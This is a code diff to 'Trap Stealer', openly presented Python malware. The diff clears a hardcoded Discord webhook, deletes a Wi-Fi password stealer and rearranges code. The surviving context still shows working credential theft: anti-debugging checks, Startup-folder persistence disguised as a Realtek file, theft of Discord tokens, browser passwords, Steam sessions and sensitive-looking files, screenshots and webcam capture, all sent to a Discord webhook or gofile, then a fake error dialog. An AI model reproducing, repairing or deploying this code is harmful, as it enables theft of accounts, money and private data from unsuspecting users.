@@ -30,9 +30,7 @@ import os, os.path, zipfile
 import shutil, json
 import win32clipboard
 ### CONFIG ### 
-
-
-webhook = 'https://discord.com/api/webhooks/1102253728842657843/7LX8d74soZhJ_JetMdiWZTD2QF7-8JlnuNoArjDgP2UAv_Z3u0xl3smsoCuiWFeRZ63l' #Put ur webhook
+webhook = '' #Put ur webhook
 
 injection = False # If set to False it will not inject into discord
 fakeerror = True # If True it will make an fake error message at the end
@@ -41,6 +39,7 @@ shitty_message = True # If True it will print fake message, if you want to disab
 antidebugging = True # If set to false it will dont check for VM or Debugger
 StartupMessage = 'An error occurred while trying to add Trap Stealer to the Startup folder.     Or maybe you just put Startup = False' # The Startup message is like that at the start and change if Startup is set to True
 
+# -----------------
 def antidebug():
     checks = [check_windows, check_ip, check_registry, check_dll]
     for check in checks:
@@ -109,17 +108,20 @@ try:
 except:
     pass
 
+# -----------------
+
 
 if shitty_message == True:
     print('Importing Module...')
 else:
     pass
+
 file_path = os.path.realpath(__file__)
 USER_NAME = getpass.getuser()
 
 
 
-path = f"{os.getenv('appdata')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Realtek.pyw"
+# -----------------
 
 def Clipboard():
   win32clipboard.OpenClipboard()
@@ -130,6 +132,10 @@ def Clipboard():
 
 
 clipboardtext = Clipboard()
+
+# -----------------
+path = f"{os.getenv('appdata')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Realtek.pyw"
+
 def startup():
     global StartupMessage
     StartupMessage = 'Sucessfully added to startup'
@@ -165,9 +171,11 @@ def LoadUrlib(hook, data='', files='', headers=''):
                 return r
         except: 
             pass
+
 requirements = [
     ["requests", "requests"],["Crypto.Cipher", "pycryptodome"]
 ]
+
 import requests
 from Crypto.Cipher import AES
 
@@ -197,8 +205,11 @@ def inj_discord():
 
 if injection == True:
     try:
+
         inj_discord()
+
     except:pass
+
 else:pass
 
 def systemInfo():
@@ -215,24 +226,6 @@ def systemInfo():
 
     return sys_info
 
-def wifi_password_stealer():
-    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="ignore").split('\n')
-    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
-
-    wifi_profiles = []
-
-    for profile in profiles:
-        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('utf-8', errors="ignore").split('\n')
-        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
-        try:
-            wifi_profiles.append((f"SSID: {profile}, Password: {results[0]}"))
-        except IndexError:
-            wifi_profiles.append((f"SSID: {profile}, Password: Cannot be read!"))
-
-    return wifi_profiles
-
-
-wifi_password = wifi_password_stealer
 def globalInfo():
     url = 'https://ipinfo.io/json'
     response = urllib.request.urlopen(url)
@@ -327,7 +320,9 @@ def CryptUnprotectData(encrypted_bytes, entropy=b''):
     
 
 if shitty_message == True:
+
     print('Adding Requests...')
+
 else:
     pass
 
@@ -349,6 +344,7 @@ def GetUHQFriends(token):
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
+
     try:
         friendslist = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
     except:
@@ -446,9 +442,13 @@ def uploadToken(token, path):
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
+
     username, hashtag, email, user_id, pfp, flags, nitro, phone = GetTokenInfo(token)
+
     pfp = f"https://cdn.discordapp.com/avatars/{user_id}/{pfp}" if pfp else "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png"
+
     billing = GetBilling(token);badge = GetBadge(flags);friends = GetUHQFriends(token)
+
     if friends == '': friends = "No Rare Friends"
     if not billing:
         badge, phone, billing = "🔒", "🔒", "🔒"
@@ -558,7 +558,9 @@ if shitty_message == True:
     print('Everything Installed...')
 else:
     pass
+
 def GetAll():
+
     browserPaths = [
         [f"{roaming}/Opera Software/Opera GX Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
         [f"{roaming}/Opera Software/Opera Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],
@@ -585,13 +587,16 @@ def GetAll():
     for patt in browserPaths: 
         a = threading.Thread(target=getToken, args=[patt[0], patt[2]])
         a.start()
+
     for patt in discordPaths: 
         a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
         a.start()
+
     for patt in browserPaths: 
         a = threading.Thread(target=getPassw, args=[patt[0], patt[3]])
         a.start()
         Threadlist.append(a)
+
 try:
     GetAll()
 except:
@@ -629,7 +634,9 @@ LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
 keyword = [
     'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
 ]
+
 pathing = 'none'
+
 def writeforfile(data, name):
     global path
     path = os.getenv("TEMP") + f"\\wp{name}.txt"
@@ -703,7 +710,7 @@ except:
 
 
 keywords = ["password", "mot_de_passe", "mdp", "motdepasse", "token", "key", "secret", "secrett", "api", "account", "login", "username", "email", "phone", "credit card", "social security number", "address", "birthdate", "security question", "PIN", "passport", "driver's license", "national ID", "bank account", "routing number", "financial information", "transaction", "balance", "wire transfer", "cryptocurrency", "bitcoin", "ethereum", "wallet", "private key", "public key"]
-extension = ".txt" # Extension of the files to search for
+extension = ".txt"
 
 
 import concurrent.futures
@@ -714,12 +721,16 @@ def upload_file(file_path):
             f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile',
             files={'file': open(file_path, 'rb')}
         )
+
         return response.json()["data"]["downloadPage"]
+    
     except:
+
         return False
 
 
 file_paths = []
+
 for path in [desktop_path, downloads_path, documents_path, pictures_path]:
     for file in os.listdir(path):
         if file.endswith(extension) and any(keyword in file for keyword in keywords):
@@ -727,6 +738,7 @@ for path in [desktop_path, downloads_path, documents_path, pictures_path]:
             file_paths.append(file_path)
 
 urls = []
+
 with concurrent.futures.ThreadPoolExecutor() as executor:
     futures = []
     for file_path in file_paths:
@@ -742,6 +754,7 @@ with concurrent.futures.ThreadPoolExecutor() as executor:
 
 if urls:
     embed_fields = [{"name": f"{i+1}. {file}", "value": f"[Click here to download]({url})"} for i, (file, url) in enumerate(urls)]
+
     data = {
         "username": "Trap Stealer",
         "content": "",
@@ -773,7 +786,7 @@ LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
 user = os.path.expanduser("~")
 
 import shutil
-
+# -------------
 def steam_st():
     steam_path = ""
     if os.path.exists(os.environ["PROGRAMFILES(X86)"]+"\\steam"):
@@ -792,14 +805,17 @@ def steam_st():
         if os.path.exists(steam_path+"\\config"):
             with zipfile.ZipFile(f"{os.environ['TEMP']}\steam_session.zip",'w',zipfile.ZIP_DEFLATED) as zp:
                 steam(steam_path+"\\config",ssfn,zp)
+
             headers = {
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
                 } 
+            
             data = {
             "username": "Trap Stealer",
             "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
             "embeds": [
+
                 {
                     "title": "🎮 Trap Stealer Steam Session",
                     "description": f"Steam session taken at : {time.strftime('%Y-%m-%d %H:%M:%S')}\n",
@@ -815,15 +831,19 @@ def steam_st():
             ]
         }
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+
         # Second request with file
         file = {"file": open(f"{os.environ['TEMP']}\steam_session.zip", "rb")}
         data = {
             "username": "Trap Stealer",
             "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png"
         }
+
         response = requests.post(webhook, files=file, data=data)
         try:
+
             os.remove(f"{os.environ['TEMP']}\steam_session.zip")
+
         except:
             pass
 
@@ -834,6 +854,7 @@ except:
     pass
 
 
+# -------------
 def screen():
 
     img = ImageGrab.grab()
@@ -859,18 +880,24 @@ def screen():
             }
         ]
     }
+
     headers = {
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
+
     LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+
     file = {"file": open(img_path, "rb")}
+
     data = {
         "username": "Trap Stealer",
         "content": "",
         "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png"
     }
+
     response = requests.post(webhook, files=file, data=data)
+
     try:
         os.remove(img_path)
     except:
@@ -889,6 +916,7 @@ except:
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
+
     data = {
         "username": "Trap Stealer",
         "content": "",
@@ -909,8 +937,9 @@ except:
         ]
     }
     LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
-
+# -------------
 def camera_grab():
+
     headers = {
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
@@ -929,7 +958,9 @@ def camera_grab():
             "content": "",
             "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png"
         }
+
         response = requests.post(webhook, files=file, data=data)
+
         subprocess.run(["rm", "image.jpg"])
 
     except FileNotFoundError:
@@ -952,6 +983,7 @@ def camera_grab():
                 }
             ]
         }
+
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
 
 try:
@@ -959,6 +991,10 @@ try:
 except:
     pass
 
+# -------------
+
 if fakeerror == True:
+
     ctypes.windll.user32.MessageBoxW(0, "Error, Restart...", "Retry!", 16)
-else:pass
+else:
+    pass
